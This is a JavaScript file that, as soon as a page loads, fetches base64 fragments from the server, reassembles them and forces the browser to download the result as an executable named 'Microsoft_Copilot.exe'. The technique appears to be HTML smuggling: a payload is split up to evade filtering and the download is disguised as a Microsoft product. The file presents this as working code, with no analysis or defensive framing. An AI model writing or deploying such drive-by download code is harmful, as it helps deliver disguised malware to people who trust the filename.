// Combine fragments and convert to Blob
// Helper to convert Base64 to Blob
function base64ToBlob(base64, mimeType) {
    try {
        const binaryString = atob(base64);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }
        return new Blob([bytes], { type: mimeType });
    } catch (error) {
        console.error("Error converting Base64 to Blob:", error);
        throw error;
    }
}

// Fetch a single fragment from a given URL
async function fetchFragment(url) {
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`Failed to fetch fragment from ${url}: ${response.statusText}`);
        }
        console.log(`Successfully fetched fragment from ${url}`);
        return await response.text(); // Assume the fragment is base64 encoded
    } catch (error) {
        console.error("Error fetching fragment:", error);
        return null;
    }
}

// Trigger download on page load
window.addEventListener("DOMContentLoaded", async () => {
    console.log("Starting file download...");

    let totalFragments = 5; // Default value in case fetching config fails

    try {
        // Fetch the fragments count from the server
        const response = await fetch("/fragments");
        if (!response.ok) {
            throw new Error(`Failed to fetch fragments config: ${response.status}`);
        }
        const config = await response.json();
        totalFragments = config.fragments;
        console.log("Total fragments:", totalFragments);

        // Proceed with fragment download
        const fragmentBaseUrl = "/fragment/"; // Base URL for fragments
        const fragmentUrls = Array.from({ length: totalFragments }, (_, i) => `${fragmentBaseUrl}${i + 1}`);

        const fragmentPromises = fragmentUrls.map(url => fetchFragment(url));
        const fragments = await Promise.all(fragmentPromises);

        // Log fragment contents for debugging
        fragments.forEach((fragment, index) => {
            if (fragment === null) {
                console.error(`Fragment ${index + 1} is missing or invalid.`);
            } else {
                console.log(`Fragment ${index + 1} fetched successfully: ${fragment}`);
            }
        });

        if (fragments.includes(null)) {
            throw new Error("Failed to fetch all fragments");
        }

        console.log("All fragments fetched successfully. Combining fragments...");

        const sanitizedFragments = fragments.map(fragment => fragment.trim());
        const combinedBase64 = sanitizedFragments.join("");

        console.log(combinedBase64);

        // Validate Base64 format
        if (!/^([A-Za-z0-9+/=]+)$/.test(combinedBase64)) {
            throw new Error("Invalid Base64 data detected in combined fragments.");
        }

        const blob = base64ToBlob(combinedBase64, "application/octet-stream");
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "Microsoft_Copilot.exe";
        a.click();
        URL.revokeObjectURL(url);

        console.log("Downloaded successfully.");
    } catch (error) {
        console.error("Download process failed:", error);
    }
});



